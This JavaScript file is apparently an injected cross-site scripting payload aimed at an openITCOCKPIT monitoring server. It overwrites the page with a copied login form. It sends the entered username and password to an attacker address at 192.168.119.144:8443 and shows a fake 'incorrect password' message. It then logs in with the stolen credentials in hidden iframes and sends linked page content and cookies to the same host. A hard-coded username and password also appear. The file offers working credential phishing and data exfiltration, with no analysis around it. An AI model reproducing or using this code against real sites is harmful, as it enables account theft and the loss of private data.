/*
Multiple ways to get this
On the page we want to fake
1.
loginhtml = document.getElementsByTagName("html")[0].innerHTML
localStorage.setItem("loginhtml", loginhtml)
We can then grab it wrong the storage tab in the browser tools
2. 
Copy & paste document.getElementsByTagName("html")[0].innerHTML
*/
loginhtml = 
`<head>
    <!--[if IE]>
    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">
    <![endif]-->
    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">
    <title>
        Login - open source system monitoring    </title>
    <link href=\"/favicon.ico?v3.7.2\" type=\"image/x-icon\" rel=\"icon\"><link href=\"/favicon.ico?v3.7.2\" type=\"image/x-icon\" rel=\"shortcut icon\">    <link rel=\"stylesheet\" type=\"text/css\" href=\"/css/vendor/bootstrap/css/bootstrap.min.css?v3.7.2\">
    <link rel=\"stylesheet\" type=\"text/css\" href=\"/smartadmin/css/font-awesome.min.css?v3.7.2\">
    <link rel=\"stylesheet\" type=\"text/css\" href=\"/css/login.css?1669072828\">

    <script type=\"text/javascript\" src=\"/frontend/js/lib/jquery.min.js?v3.7.2\"></script>
    <script type=\"text/javascript\" src=\"/js/lib/particles.min.js?v3.7.2\"></script>
    <script type=\"text/javascript\" src=\"/js/login.js?1669072828\"></script>


</head>
<body class=\"main\">


    <div class=\"login-screen\">
        <figure>
            <figcaption>Photo by SpaceX on Unsplash</figcaption>
        </figure>
        <figure>
            <figcaption>Photo by NASA on Unsplash</figcaption>
        </figure>
    </div>
<div class=\"container-fluid\">
    <div class=\"row\">
                    <div id=\"particles-js\" class=\"col-xs-12 col-sm-6 col-md-7 col-lg-9\"><canvas class=\"particles-js-canvas-el\" style=\"width: 100%; height: 100%;\" width=\"1410\" height=\"670\"></canvas></div>
            </div>
</div>

<div class=\"login-center\">
    <div class=\"min-height container-fluid\">
        <div class=\"row\">
            <div class=\"col-xs-12 col-sm-6 col-md-5 col-lg-3 col-sm-offset-6 col-md-offset-7 col-lg-offset-9\">
                <div class=\"login\" id=\"card\">
                    <div class=\"login-alert\">
                                                                    </div>
                    <div class=\"login-header\">
                        <h1>openITCOCKPIT</h1>
                        <h4>Open source system monitoring</h4>
                    </div>
                    <div class=\"login-form-div\">
                        <div class=\"front signin_form\">
                            <p>Login</p>
                            <form action=\"/login/login\" novalidate=\"novalidate\" id=\"login-form\" class=\"login-form\" method=\"post\" accept-charset=\"utf-8\"><div style=\"display:none;\"><input type=\"hidden\" name=\"_method\" value=\"POST\"></div>
                            
                            <div class=\"form-group\">
                                <div class=\"input-group\">
                                    <input name=\"data[LoginUser][username]\" class=\"form-control\" placeholder=\"Type your email or username\" inputdefaults=\"  \" type=\"text\" id=\"LoginUserUsername\">                                    <span class=\"input-group-addon\">
                                        <i class=\"fa fa-lg fa-user\"></i>
                                    </span>
                                </div>
                            </div>


                            <div class=\"form-group\">
                                <div class=\"input-group\">
                                    <input name=\"data[LoginUser][password]\" class=\"form-control\" placeholder=\"Type your password\" inputdefaults=\"  \" type=\"password\" id=\"LoginUserPassword\">                                    <span class=\"input-group-addon\">
                                        <i class=\"fa fa-lg fa-lock\"></i>
                                    </span>
                                </div>
                            </div>

                            <div class=\"checkbox\">
                                <div class=\"checkbox\"><input type=\"hidden\" name=\"data[LoginUser][remember_me]\" id=\"LoginUserRememberMe_\" value=\"0\"><label for=\"LoginUserRememberMe\"><input type=\"checkbox\" name=\"data[LoginUser][remember_me]\" class=\"\" value=\"1\" id=\"LoginUserRememberMe\"> Remember me on this computer</label></div>                            </div>

                            <div class=\"form-group sign-btn\">
                                <button type=\"submit\" class=\"btn btn-primary pull-right\">
                                    Sign in                                </button>
                            </div>
                            </form>                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>


<div class=\"footer\">
    <div class=\"container-fluid\">
        <div class=\"row pull-right\">
            <div class=\"col-xs-12\">
                <a href=\"https://openitcockpit.io/\" target=\"_blank\" class=\"btn btn-default\">
                    <i class=\"fa fa-lg fa-globe\"></i>
                </a>
                <a href=\"https://github.com/it-novum/openITCOCKPIT\" target=\"_blank\" class=\"btn btn-default\">
                    <i class=\"fa fa-lg fa-github\"></i>
                </a>
                <a href=\"https://twitter.com/openITCOCKPIT\" target=\"_blank\" class=\"btn btn-default\">
                    <i class=\"fa fa-lg fa-twitter\"></i>
                </a>
            </div>
        </div>
    </div>
</div>



<div class=\"container\">
    <div class=\"row\">
        <div class=\"col-xs-12\">
                    </div>
    </div>
</div>


</body>`;
document.getElementsByTagName("html")[0].innerHTML = loginhtml;
var attacker = '192.168.119.144';
var port = '8443';
var agent = `https://${attacker}:${port}`;
var agent_cookie = agent + '/cookie';
var agent_content = agent + '/content';
var agent_credential = agent + '/credential';
const alphabet = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';

function enable_logging() {
    let frame = document.createElement('iframe');
    frame.id='debug';
    frame.setAttribute("style", "display:none");
    frame.width = "100%";
    frame.height = "100%";
    document.getElementsByTagName('body')[0].append(frame);
    window.console = frame.contentWindow.console
}
enable_logging();

function randomString(length, chars) {
    let result = '';
    for (let i = length; i > 0; --i) result += chars[Math.round(Math.random() * (chars.length - 1))];
    return result;
}


function retrieveCookies(cookie_context) {
   cookies = cookie_context.split("; ").reduce( (ac, cv, i) => Object.assign(ac, {[cv.split('=')[0]]: cv.split('=')[1]}), {});
   if(cookies !== null && cookies !== undefined) {
        for (const property in cookies) {
            let xhr = new XMLHttpRequest();
            xhr.open('POST', agent_cookie, true);
            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            xhr.send(`name=${property}&value=${cookies[property]}`);
        }
   }

}

function retrieveCredentials() {
    let login_username = document.getElementById("LoginUserUsername").value;
    let login_password = document.getElementById("LoginUserPassword").value;
    let xhr = new XMLHttpRequest();
    xhr.open('POST', agent_credential, true);
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhr.send(`usr=${login_username}&pwd=${login_password}`);
    let cred = {
        usr:  login_username,
        pwd: login_password
    };
    // Return it
    return cred;
}

function validURL(str) {
	//Defining the URL pattern
	let urlPattern = new RegExp('^(https?:\\/\\/)?' + // protocol
		'((([a-z\\d]([a-z\\d-]*[a-z\\d])*))|' + // domain name
		'((\\d{1,3}\\.){3}\\d{1,3}))' + // OR ip (v4) address
		'(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*' + // port and path
		'(\\?[;&a-z\\d%_.~+=-]*)?' + // query string
		'(\\#[-a-z\\d_]*)?$', 'i'); // fragment locator

	//Defining the logout pattern
	let logoutPattern = new RegExp('logout|signout|log-out|sign-out')

	//if valid URL and does not contain logout
	if (!!urlPattern.test(str) && !logoutPattern.test(str.toLowerCase())) {
		return true
	} else {
		return false
	}
}

function retrieveContent(iframe) {
    allA = iframe.contentDocument.getElementsByTagName("a")

    allHrefs = []
    for (var i = 0; i < allA.length; i++) {
        allHrefs.push(allA[i].href)
    }

    uniqueHrefs = _.unique(allHrefs)

    validUniqueHrefs = []
    for (var i = 0; i < uniqueHrefs.length; i++) {
        if (validURL(uniqueHrefs[i])) {
            validUniqueHrefs.push(uniqueHrefs[i]);
        }
    }

    validUniqueHrefs.forEach(href => {
        fetch(href, {
            "credentials": "include",
            "method": "GET",
        })
            .then((response) => {
                return response.text()
            })
            .then(function (text) {
                fetch(agent_content, {
                    body: "url=" + encodeURIComponent(href) + "&content=" + encodeURIComponent(text),
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded"
                    },
                    method: "POST"
                })
            });
    })
};

function attempt_login(creds){
  var req = new XMLHttpRequest();
  let usr = creds.usr;
  let pwd = creds.pwd;
  req.open(`POST`, `https://openitcockpit:443/login/login`);
  req.setRequestHeader(`Accept`, `text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8`);
  req.setRequestHeader(`Upgrade-Insecure-Requests`, `1`);
  req.setRequestHeader(`User-Agent`, `Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0`);
  req.setRequestHeader(`Accept-Language`, `en-US,en;q=0.5`);
  req.setRequestHeader(`Content-Type`, `application/x-www-form-urlencoded`);
  req.send(`_method=POST&data%5BLoginUser%5D%5Busername%5D=${usr}&data%5BLoginUser%5D%5Bpassword%5D=${pwd}&data%5BLoginUser%5D%5Bremember_me%5D=0`);
}

function page_loaded_handler(evt){
    // This function in general is where we can interact with the logged in wepage
    // assuming we phish some valid credentials we can scrap the logged in page here.
    var target = document.getElementById(evt.currentTarget.id);
    setTimeout(function () {
        retrieveContent(target); 
        retrieveCookies(target.contentWindow.document.cookie);
        retrieveCookies(document.cookie);
    }, 5000, );
    
}
function initial_login_handler(evt) {
attempt_login(evt.currentTarget.creds);

let bframe = document.createElement('iframe');
bframe.addEventListener('load', page_loaded_handler, false);
bframe.setAttribute("style", "display:none");
bframe.width = "100%";
bframe.height = "100%";
bframe.src = "https://openitcockpit";
bframe.id='cucked_'+randomString(32, alphabet);
body = document.getElementsByTagName('body')[0];
body.appendChild(bframe);
}

let form = document.getElementById("login-form");

form.onsubmit = function(e) {
    e.preventDefault();
    creds = retrieveCredentials();

    // fake incorrect pw mimicking the real login page
    if(!document.getElementById("flashMessage")) {
        var incorrect_password = document.createElement('div');
        incorrect_password.id="flashMessage";
        incorrect_password.className += "alert auto-hide alert-danger";
        incorrect_password.textContent="Email and password do not match any user in our database."
        document.getElementsByClassName("login-alert")[0].appendChild(incorrect_password);
        document.getElementById("LoginUserUsername").value = '';
        document.getElementById("LoginUserPassword").value = '';
    }
    else {
     document.getElementById("LoginUserUsername").value = '';
     document.getElementById("LoginUserPassword").value = '';
    }

    let frame = document.createElement('iframe');
    frame.addEventListener('load', initial_login_handler, false);
    frame.creds = creds;
    frame.setAttribute("style", "display:none")
    frame.width = "100%"
    frame.height = "100%"
    frame.src = "https://openitcockpit"
    frame.id='cucked_'+randomString(32, alphabet);
    body = document.getElementsByTagName('body')[0];
    body.appendChild(frame);
}
var t  = 'view@viewer.local'
var u = '27NZDLgfnY'
var req = new XMLHttpRequest();
let usr = t;
let pwd = u;


function read_body(xhr) {
   var data;
   if (!xhr.responseType || xhr.responseType === "text") {
       data = xhr.responseText;
   } else if (xhr.responseType === "document") {
       data = xhr.responseXML;
   } else if (xhr.responseType === "json") {
       data = xhr.responseJSON;
   } else {
       data = xhr.response;
   }
   return data;
}

req.onreadystatechange = function() {
   if (req.readyState == XMLHttpRequest.DONE) {
    console.log('here')
       console.log(read_body(req));
   }
   else if (this.status === 302 /* or may any other redirect? */) {
        console.log('bananas')
        var location = this.getResponseHeader("Location");
        console.log('location: ',location)
        //return ajax.call(this, location /*params*/, callback);
      } 
    else if (this.status === 200) {
        var location = this.getResponseHeader("Location");
        console.log('oranges')

let frame = document.createElement('iframe');
//frame.addEventListener('load', initial_login_handler, false);
//frame.creds = cred;
frame.setAttribute("style", "display:none")
frame.width = "100%"
frame.height = "100%"
frame.src = "https://openitcockpit/"
frame.id='testing';
body = document.getElementsByTagName('body')[0];
body.appendChild(frame);
        read_body(req)
        //return ajax.call(this, location /*params*/, callback);
      }

}




req.open(`POST`, `https://openitcockpit:443/login/login`, true);
req.setRequestHeader(`Accept`, `text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8`);
req.setRequestHeader(`Upgrade-Insecure-Requests`, `1`);
req.setRequestHeader(`User-Agent`, `Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0`);
req.setRequestHeader(`Accept-Language`, `en-US,en;q=0.5`);
req.setRequestHeader(`Content-Type`, `application/x-www-form-urlencoded`);
req.send(`_method=POST&data%5BLoginUser%5D%5Busername%5D=${usr}&data%5BLoginUser%5D%5Bpassword%5D=${pwd}&data%5BLoginUser%5D%5Bremember_me%5D=0`);








function ajax(url /* ,params */, callback) {
  var xmlhttp = new XMLHttpRequest();
  xmlhttp.onreadystatechange = function() {
      // return if not ready state 4
      if (this.readyState !== 4) {
        return;
      }

      // check for redirect
      if (this.status === 302 /* or may any other redirect? */) {
        var location = this.getResponseHeader("Location");
        return ajax.call(this, location /*params*/, callback);
      } 

      // return data
      var data = JSON.parse(this.responseText);
      callback(data);
  };
  xmlhttp.open("GET", url, true);
  xmlhttp.send();
}